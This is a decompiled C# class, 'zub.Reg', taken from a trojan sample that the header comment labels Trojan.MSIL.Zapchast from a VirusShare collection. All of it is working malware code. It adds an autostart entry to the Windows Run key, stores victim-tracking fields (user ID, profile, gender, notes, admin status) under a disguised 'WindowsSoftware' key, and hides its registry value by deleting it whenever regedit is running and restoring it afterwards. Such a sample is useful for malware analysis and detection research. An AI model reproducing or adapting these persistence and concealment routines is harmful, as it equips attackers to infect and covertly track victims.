// Decompiled with JetBrains decompiler
// Type: zub.Reg
// Assembly: zub, Version=1.0.1.5, Culture=neutral, PublicKeyToken=null
// MVID: 48A5438B-11FD-4EEE-88C7-AA931AE92F31
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00000-msil\Trojan.MSIL.Zapchast.aaxrn-15afce431f9064b1d75b7e7f83f2d7ad5b9e68621f44a39c75ffd88172493695.exe

using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using zub.My;

namespace zub
{
  public class Reg
  {
    private Log log;
    private RegistryKey oRegKey;
    private RegistryKey checkkey32;
    private RegistryKey checkkey64;
    private RegistryKey VictemValue;

    public Reg() => this.log = new Log();

    public void setRUNkey(bool Admin)
    {
      try
      {
        if (Admin)
        {
          this.oRegKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
          this.checkkey32 = Registry.LocalMachine.OpenSubKey("SOFTWARE", true);
          this.checkkey64 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Wow6432Node", true);
        }
        else
        {
          this.oRegKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
          this.checkkey32 = Registry.CurrentUser.OpenSubKey("SOFTWARE", true);
          this.checkkey64 = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Wow6432Node", true);
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        Exception exception = ex;
        this.log.writeLog(MyProject.Forms.Form1.Logpfad, "log.dat", Conversions.ToString(MyProject.Computer.Clock.GmtTime) + " | " + exception.Message + " | => Fehler beim set runKey!");
        ProjectData.ClearProjectError();
      }
    }

    public bool checkReg64()
    {
      try
      {
        if (this.checkkey64 == null)
        {
          this.VictemValue = !MyProject.Forms.Form1.Usertyp ? Registry.CurrentUser.OpenSubKey("SOFTWARE\\WindowsSoftware", true) : Registry.LocalMachine.OpenSubKey("SOFTWARE\\WindowsSoftware", true);
          return false;
        }
        this.VictemValue = !MyProject.Forms.Form1.Usertyp ? Registry.CurrentUser.OpenSubKey("SOFTWARE\\Wow6432Node\\WindowsSoftware", true) : Registry.LocalMachine.OpenSubKey("SOFTWARE\\Wow6432Node\\WindowsSoftware", true);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        Exception exception = ex;
        this.log.writeLog(MyProject.Forms.Form1.Logpfad, "log.dat", Conversions.ToString(MyProject.Computer.Clock.GmtTime) + " | " + exception.Message + " | => Fehler beim checkx64");
        ProjectData.ClearProjectError();
      }
      return true;
    }

    public void writeRunKey(string Keyname, string Value)
    {
      try
      {
        this.oRegKey.SetValue(Keyname, (object) Value);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        Exception exception = ex;
        this.log.writeLog(MyProject.Forms.Form1.Logpfad, "log.dat", Conversions.ToString(MyProject.Computer.Clock.GmtTime) + " | " + exception.Message + " | => Fehler beim write runKey!");
        ProjectData.ClearProjectError();
      }
    }

    public bool ReadKey()
    {
      bool flag;
      try
      {
        MyProject.Forms.Form1.VictimID = Conversions.ToString(this.VictemValue.GetValue("Amateri-User", (object) ("Vic-" + Conversions.ToString(DateTime.Now))));
        MyProject.Forms.Form1.Notiz = Conversions.ToString(this.VictemValue.GetValue("Victem-Notiz", (object) "Nicht mit Autoinfact infiziert"));
        MyProject.Forms.Form1.AmaProfil = Conversions.ToString(this.VictemValue.GetValue("Amateri-Profil", (object) "Unbekannt"));
        MyProject.Forms.Form1.AmaNachricht = Conversions.ToString(this.VictemValue.GetValue("Amateri-Nachricht", (object) "Unbekannt"));
        MyProject.Forms.Form1.AmaGeschlecht = Conversions.ToString(this.VictemValue.GetValue("Amateri-Geschlecht", (object) "Unbekannt"));
        MyProject.Forms.Form1.flagmeColor = Conversions.ToString(this.VictemValue.GetValue("flagme", (object) "0"));
        MyProject.Forms.Form1.firstrun = Conversions.ToString(this.VictemValue.GetValue("firstrun", (object) DateTime.Now));
        MyProject.Forms.Form1.Usertyp = Conversions.ToBoolean(this.VictemValue.GetValue("isadmin", (object) MyProject.Forms.Form1.IsAdmin()));
        flag = true;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        Exception exception = ex;
        this.log.writeLog(MyProject.Forms.Form1.Logpfad, "log.dat", Conversions.ToString(MyProject.Computer.Clock.GmtTime) + " | " + exception.Message + " | => Fehler beim lesen der Parameter");
        flag = false;
        ProjectData.ClearProjectError();
      }
      return flag;
    }

    public bool writeVitemValue(string name, string wert)
    {
      bool flag;
      try
      {
        this.VictemValue.SetValue(name, (object) wert);
        flag = true;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        Exception exception = ex;
        this.log.writeLog(MyProject.Forms.Form1.Logpfad, "log.dat", Conversions.ToString(MyProject.Computer.Clock.GmtTime) + " | " + exception.Message + " | => Fehler beim schreibenRoot der Parameter");
        flag = false;
        ProjectData.ClearProjectError();
      }
      return flag;
    }

    public bool WriteKey()
    {
      try
      {
        if (this.checkkey64 == null)
          this.checkkey32.CreateSubKey("WindowsSoftware");
        else
          this.checkkey64.CreateSubKey("WindowsSoftware");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        Exception exception = ex;
        this.log.writeLog(MyProject.Forms.Form1.Logpfad, "log.dat", Conversions.ToString(MyProject.Computer.Clock.GmtTime) + " | " + exception.Message + " | => Fehler beim schreibenRoot des Rootfolders");
        ProjectData.ClearProjectError();
      }
      bool flag;
      try
      {
        if (this.VictemValue.GetValue("Victem-Notiz", (object) "0") == null)
          this.VictemValue.SetValue("Victem-Notiz", (object) MyProject.Forms.Form1.Notiz.ToString());
        if (this.VictemValue.GetValue("Amateri-User", (object) "0") == null)
          this.VictemValue.SetValue("Amateri-User", (object) MyProject.Forms.Form1.VictimID.ToString());
        if (this.VictemValue.GetValue("Amateri-Profil", (object) "0") == null)
          this.VictemValue.SetValue("Amateri-Profil", (object) MyProject.Forms.Form1.AmaProfil.ToString());
        if (this.VictemValue.GetValue("Amateri-Nachricht", (object) "0") == null)
          this.VictemValue.SetValue("Amateri-Nachricht", (object) MyProject.Forms.Form1.AmaNachricht.ToString());
        if (this.VictemValue.GetValue("Amateri-Geschlecht", (object) "0") == null)
          this.VictemValue.SetValue("Amateri-Geschlecht", (object) MyProject.Forms.Form1.AmaGeschlecht.ToString());
        if (Operators.ConditionalCompareObjectEqual(this.VictemValue.GetValue("flagme", (object) "0"), (object) null, false))
          this.VictemValue.SetValue("flagme", (object) MyProject.Forms.Form1.flagmeColor);
        if (Operators.ConditionalCompareObjectEqual(this.VictemValue.GetValue("firstrun", (object) "0"), (object) null, false))
          this.VictemValue.SetValue("firstrun", (object) MyProject.Computer.Clock.GmtTime);
        if (Operators.ConditionalCompareObjectEqual(this.VictemValue.GetValue("isadmin", (object) "0"), (object) null, false))
          this.VictemValue.SetValue("isadmin", (object) MyProject.Forms.Form1.Usertyp);
        flag = true;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        Exception exception = ex;
        this.log.writeLog(MyProject.Forms.Form1.Logpfad, "log.dat", Conversions.ToString(MyProject.Computer.Clock.GmtTime) + " | " + exception.Message + " | => Fehler beim schreiben der Parameter");
        flag = false;
        ProjectData.ClearProjectError();
      }
      return flag;
    }

    public static void HideValueFromRegistry(
      Reg.HKEY HKEY,
      string SubKey,
      string Name,
      string KeyValue)
    {
      try
      {
        List<string> stringList = new List<string>();
        Process[] processes = Process.GetProcesses();
        int index = 0;
        while (index < processes.Length)
        {
          Process process = processes[index];
          stringList.Add(process.ProcessName);
          checked { ++index; }
        }
        if (stringList.Contains("regedit"))
        {
          switch (HKEY)
          {
            case Reg.HKEY.ClassesRoot:
              if (Registry.ClassesRoot.OpenSubKey(SubKey).GetValue(Name) == null)
                break;
              MyProject.Computer.Registry.ClassesRoot.OpenSubKey(SubKey, true).DeleteValue(Name);
              break;
            case Reg.HKEY.CurrentUser:
              if (Registry.CurrentUser.OpenSubKey(SubKey).GetValue(Name) == null)
                break;
              MyProject.Computer.Registry.CurrentUser.OpenSubKey(SubKey, true).DeleteValue(Name);
              break;
            case Reg.HKEY.LocalMachine:
              if (Registry.LocalMachine.OpenSubKey(SubKey).GetValue(Name) == null)
                break;
              MyProject.Computer.Registry.LocalMachine.OpenSubKey(SubKey, true).DeleteValue(Name);
              break;
            case Reg.HKEY.Users:
              if (Registry.Users.OpenSubKey(SubKey).GetValue(Name) == null)
                break;
              MyProject.Computer.Registry.Users.OpenSubKey(SubKey, true).DeleteValue(Name);
              break;
            case Reg.HKEY.CurrentConfig:
              if (Registry.CurrentConfig.OpenSubKey(SubKey).GetValue(Name) == null)
                break;
              MyProject.Computer.Registry.CurrentConfig.OpenSubKey(SubKey, true).DeleteValue(Name);
              break;
          }
        }
        else
        {
          switch (HKEY)
          {
            case Reg.HKEY.ClassesRoot:
              if (Registry.ClassesRoot.OpenSubKey(SubKey).GetValue(Name) != null)
                break;
              MyProject.Computer.Registry.ClassesRoot.OpenSubKey(SubKey, true).SetValue(Name, (object) KeyValue);
              break;
            case Reg.HKEY.CurrentUser:
              if (Registry.CurrentUser.OpenSubKey(SubKey).GetValue(Name) != null)
                break;
              MyProject.Computer.Registry.CurrentUser.OpenSubKey(SubKey, true).SetValue(Name, (object) KeyValue);
              break;
            case Reg.HKEY.LocalMachine:
              if (Registry.LocalMachine.OpenSubKey(SubKey).GetValue(Name) != null)
                break;
              MyProject.Computer.Registry.LocalMachine.OpenSubKey(SubKey, true).SetValue(Name, (object) KeyValue);
              break;
            case Reg.HKEY.Users:
              if (Registry.Users.OpenSubKey(SubKey).GetValue(Name) != null)
                break;
              MyProject.Computer.Registry.Users.OpenSubKey(SubKey, true).SetValue(Name, (object) KeyValue);
              break;
            case Reg.HKEY.CurrentConfig:
              if (Registry.CurrentConfig.OpenSubKey(SubKey).GetValue(Name) != null)
                break;
              MyProject.Computer.Registry.CurrentConfig.OpenSubKey(SubKey, true).SetValue(Name, (object) KeyValue);
              break;
          }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public enum HKEY
    {
      ClassesRoot,
      CurrentUser,
      LocalMachine,
      Users,
      CurrentConfig,
    }
  }
}
